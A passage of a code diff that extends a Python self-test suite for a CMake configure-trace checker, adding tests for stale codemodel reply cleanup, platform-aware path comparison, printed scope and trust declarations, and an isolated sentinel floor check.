+    error-*.json files sitting in reply/ - the exact "stale reply
+    lingers" shape, portable and 100% reproducible.
+    """
+    root = os.path.join(scratch, "codemodel_staleness_fixture")
+    good_cmakelists = (
+        "cmake_minimum_required(VERSION 3.25)\n"
+        "project(codemodel_staleness_fixture NONE)\n"
+        "add_custom_target(dummy)\n"
+    )
+    write_fixture(root, good_cmakelists)
+    build_dir = os.path.join(root, "build")
+    os.makedirs(build_dir, exist_ok=True)
+    subprocess.run(["cmake", "-S", root, "-B", build_dir], capture_output=True)
+
+    # Establishes a genuine, fresh, SUCCESSFUL reply first.
+    first_scratch = make_scratch_workdir()
+    try:
+        run_configure_with_trace(root, build_dir, os.path.join(first_scratch, "trace.json"))
+    finally:
+        shutil.rmtree(first_scratch, ignore_errors=True)
+
+    reply_dir = os.path.join(build_dir, ".cmake", "api", "v1", "reply")
+    fake_stale = os.path.join(reply_dir, "index-0000-01-01T00-00-00-0000.json")
+    with open(fake_stale, "w", encoding="utf-8") as handle:
+        json.dump(
+            {
+                "cmake": {},
+                "objects": [],
+                "reply": {
+                    "codemodel-v2": {
+                        "error": "PLANTED STALE ENTRY - if this is what got"
+                        " read, the staleness fix did not run"
+                    }
+                },
+            },
+            handle,
+        )
+    # Force this planted file to look NEWEST by mtime, so a naive
+    # max(candidates, key=os.path.getmtime) (the pre-fix logic) would
+    # pick it over any OTHER stale file present, removing any doubt
+    # about mtime ordering deciding the outcome by accident.
+    future = time.time() + 3600
+    os.utime(fake_stale, (future, future))
+
+    # NOW break the tree with a pure parse error - CMake will fail
+    # before ever reaching project(), so its own success-path cleanup
+    # (confirmed live, see this function's own docstring) never runs.
+    write_fixture(root, "cmake_minimum_required(VERSION 3.25\nproject(unclosed NONE)\n")
+
+    second_scratch = make_scratch_workdir()
+    try:
+        configure_result = run_configure_with_trace(
+            root, build_dir, os.path.join(second_scratch, "trace.json")
+        )
+        codemodel, error = read_codemodel_reply(build_dir)
+        ok = (
+            configure_result.returncode != 0  # the parse error really happened
+            and not os.path.exists(fake_stale)  # the plant is GONE, not just outranked
+            and error is not None
+            and "PLANTED STALE ENTRY" not in error  # never read the plant as truth
+        )
+        return selftest_report(
+            "floor: a planted stale codemodel reply pointer, with its"
+            " mtime forced into the future, is REMOVED before a"
+            " reconfigure that itself FAILS (parse error, before CMake's"
+            " own success-path cleanup would ever run) - never read as"
+            " if it were an answer for this attempt",
+            ok,
+            detail=f"configure_rc={configure_result.returncode}"
+            f" fake_stale_exists={os.path.exists(fake_stale)} error={error!r}",
+        )
+    finally:
+        shutil.rmtree(second_scratch, ignore_errors=True)
+
+
+def selftest_same_path_platform_aware(_scratch):
+    """REVIEW3-DEPZERO-TRACE.md item 8 (IMPORTANTE, declared as a
+    hypothesis by the reviewer, not confirmed nor refuted): exact
+    string equality in FLOOR(sentinel)'s path comparison could false-
+    positive-REPROVE on Windows/NTFS (case-insensitive, case-
+    PRESERVING) if CMake's trace and Python's realpath() ever disagree
+    on letter case for the same file. same_path_platform_aware() now
+    does the comparison via os.path.normcase(), Python's own
+    documented, platform-aware tool for exactly this - a no-op on
+    POSIX, case-folding on Windows.
+
+    What THIS control can and cannot prove, stated plainly (the same
+    honesty the reviewer's own finding used): it CANNOT reproduce
+    Windows' case-insensitive behavior on this Linux machine - POSIX is
+    case-SENSITIVE, so two paths differing only by case name two
+    DIFFERENT files here, and normcase() correctly leaves them
+    distinct. What it CAN and DOES prove: (a) identical paths compare
+    equal, (b) genuinely case-different paths do NOT collapse into
+    "the same" on POSIX (proving the fix is normcase(), which respects
+    platform case-sensitivity, and NOT a blanket .lower() that would
+    be WRONG here - .lower() would make this control FAIL, since it
+    would treat "/a/B" and "/a/b" as the same file on a filesystem
+    where they are not).
+    """
+    identical_ok = same_path_platform_aware("/a/b/CMakeLists.txt", "/a/b/CMakeLists.txt")
+    case_differs_on_posix = not same_path_platform_aware("/a/b/CMakeLists.txt", "/a/b/cmakelists.txt")
+    ok = identical_ok and case_differs_on_posix
+    return selftest_report(
+        "same_path_platform_aware(): identical paths match; on THIS"
+        " (case-sensitive) platform, case-different paths correctly"
+        " stay distinct - proves normcase() is used, not a blanket"
+        " lower() that would be wrong here. Windows-specific"
+        " insensitivity itself is UNPROVABLE from Linux and not"
+        " claimed (REVIEW3-DEPZERO-TRACE.md item 8's own honesty)",
+        ok,
+        detail=f"identical_ok={identical_ok} case_differs_on_posix={case_differs_on_posix}",
+    )
+
+
+def selftest_declarations_printed_on_every_run(scratch):
+    """REVIEW3-DEPZERO-TRACE.md item 4 (trust boundary, undeclared) and
+    CRITICO #3 (scope declaration overstated the shallow net's
+    coverage of file()/execute_process()): both declarations must
+    appear on every REAL invocation (--selftest's own fixtures never
+    go through real_main(), so this is the one control that actually
+    runs the script as a SUBPROCESS, the same way tests/CMakeLists.txt
+    does, and reads its stdout).
+    """
+    root = os.path.join(scratch, "declarations_fixture")
+    write_fixture(
+        root,
+        "cmake_minimum_required(VERSION 3.25)\n"
+        "project(declarations_fixture NONE)\n"
+        "add_custom_target(dummy)\n",
+    )
+    build_dir = os.path.join(root, "build")
+    os.makedirs(build_dir, exist_ok=True)
+    subprocess.run(["cmake", "-S", root, "-B", build_dir], capture_output=True)
+
+    script_path = os.path.abspath(__file__)
+    result = subprocess.run(
+        [sys.executable, script_path, root, build_dir],
+        capture_output=True,
+        text=True,
+    )
+    ok = (
+        "file(DOWNLOAD|UPLOAD) or execute_process()" in result.stdout
+        and "must never be invoked with a source-root/build-dir pair" in result.stdout
+    )
+    return selftest_report(
+        "declares, on every run, the scope limit of the shallow-net"
+        " promise (file()/execute_process() gap) and the trust boundary"
+        " (this script RUNS the tree it is pointed at)",
+        ok,
+        detail=f"stdout={result.stdout!r}",
+    )
+
+
+def _floor_line_for(report, label):
+    """The one line in report.floor_lines starting "FLOOR(<label>):",
+    or None. Lets a selftest control assert on ONE floor's own verdict
+    without being confused by the others (see this function's own
+    caller for why that distinction matters).
+    """
+    prefix = f"FLOOR({label}):"
+    for line in report.floor_lines:
+        if line.startswith(prefix):
+            return line
+    return None
+
+
 def selftest_floor_missing_sentinel_reproves(scratch):
-    # A trace that never touches the REAL root's own CMakeLists.txt -
-    # built by configuring one fixture, then judging its trace against
-    # a DIFFERENT fixture's source_root, so the sentinel's realpath
-    # comparison genuinely fails (not simulated).
+    """REVIEW3-DEPZERO-TRACE.md item 6: the PREVIOUS version of this
+    control judged a real trace against an UNRELATED source_root, which
+    made FLOOR(repo-scan) and FLOOR(codemodel) ALSO fail (0 events
+    under an unrelated root; 0 targets, no add_custom_target in that
+    tiny fixture) - three floors failing for three DIFFERENT reasons in
+    the same fixture, while the assertion only checked "the word
+    'sentinel' appears somewhere in the output", which is true of the
+    PASSING sentinel line's own label too. The reviewer mutated
+    check_floor_sentinel() to always return True and this control
+    stayed green, because floor_ok was still False from the OTHER two
+    floors regardless.
+
+    Fixed by construction, not by a smarter assertion alone: source_root
+    passed to judge() is the fixture's PARENT directory (an ANCESTOR of
+    where the real configure ran), not an unrelated tree. That keeps
+    FLOOR(repo-scan) passing (the real project()/add_custom_target
+    events are still textually UNDER the parent directory - is_under_
+    root()'s own startswith(root + os.sep) check does not care how far
+    below the root a file sits) and FLOOR(codemodel) passing (the real
+    build still resolves its own real add_custom_target(dummy)), while
+    FLOOR(sentinel) is the ONLY one that can fail: the root CMakeLists.
+    txt project() event MUST sit AT source_root/CMakeLists.txt exactly,
+    and it does not - it sits one directory deeper. _floor_line_for()
+    then asserts on the FOUR floor lines INDIVIDUALLY, not on whether
+    the word "sentinel" merely occurs.
+    """
     real_root = os.path.join(scratch, "floor_sentinel_real")
-    write_fixture(real_root, "cmake_minimum_required(VERSION 3.25)\nproject(floor_sentinel_real NONE)\n")
+    write_fixture(
+        real_root,
+        "cmake_minimum_required(VERSION 3.25)\n"
+        "project(floor_sentinel_real NONE)\n"
+        "add_custom_target(dummy)\n",
+    )
     real_build = os.path.join(real_root, "build")
     os.makedirs(real_build, exist_ok=True)
     subprocess.run(["cmake", "-S", real_root, "-B", real_build], capture_output=True)
 
-    other_root = os.path.join(scratch, "floor_sentinel_other")
-    write_fixture(other_root, "cmake_minimum_required(VERSION 3.25)\nproject(floor_sentinel_other NONE)\n")
+    # scratch itself is the ANCESTOR source_root - real_root sits one
+    # level below it, and has no CMakeLists.txt of its own.
+    ancestor_source_root = scratch
 
     trace_scratch = make_scratch_workdir()
     try:
         trace_path = os.path.join(trace_scratch, "trace.json")
         run_configure_with_trace(real_root, real_build, trace_path)
-        # Judge the REAL trace, but against OTHER_ROOT's source root -
-        # the project() event's file will never match other_root's
-        # CMakeLists.txt.
-        report = judge(other_root, real_build, trace_path, False)
-        ok = not report.floor_ok and any("sentinel" in line for line in report.floor_lines)
+        report = judge(ancestor_source_root, real_build, trace_path, False)
+
+        parity_line = _floor_line_for(report, "parity")
+        scan_line = _floor_line_for(report, "repo-scan")
+        sentinel_line = _floor_line_for(report, "sentinel")
+        codemodel_line = _floor_line_for(report, "codemodel")
+
+        isolated = (
+            not report.floor_ok
+            and parity_line is not None
+            and "could not use" not in parity_line
+            and scan_line is not None
+            and "empty scan" not in scan_line
+            and sentinel_line is not None
+            and "never appeared" in sentinel_line
+            and codemodel_line is not None
+            and "0 targets" not in codemodel_line
+        )
         return selftest_report(
-            "floor: a trace whose project() event never matches the given"
-            " source root reproves by sentinel",
-            ok,
+            "floor: a trace whose project() event sits one directory"
+            " below the given source root reproves by sentinel ALONE"
+            " (parity/repo-scan/codemodel stay green - isolation proven,"
+            " not just floor_ok being False for some reason)",
+            isolated,
             detail=f"floor_lines={report.floor_lines}",
         )
     finally:
@@ -1310,10 +2118,19 @@ def selftest_main():
         selftest_hostile_cpm_sibling,
         selftest_hostile_pkg_check_modules_digit_name,
         selftest_hostile_add_subdirectory_outside_tree,
+        selftest_hostile_file_download,
+        selftest_hostile_execute_process_disallowed_program,
         selftest_positive_find_package_multiline,
         selftest_positive_pkg_check_modules_version_comparator,
+        selftest_positive_execute_process_pkgconfig,
+        selftest_execute_process_empty_launcher_slot_not_misidentified,
         selftest_floor_empty_trace_reproves,
         selftest_floor_corrupted_line_reproves_by_parity,
+        selftest_is_under_root_rejects_empty_and_relative,
+        selftest_floor_events_without_file_do_not_inflate_scan,
+        selftest_codemodel_reply_not_stale,
+        selftest_same_path_platform_aware,
+        selftest_declarations_printed_on_every_run,
         selftest_floor_missing_sentinel_reproves,
     ]
     try:
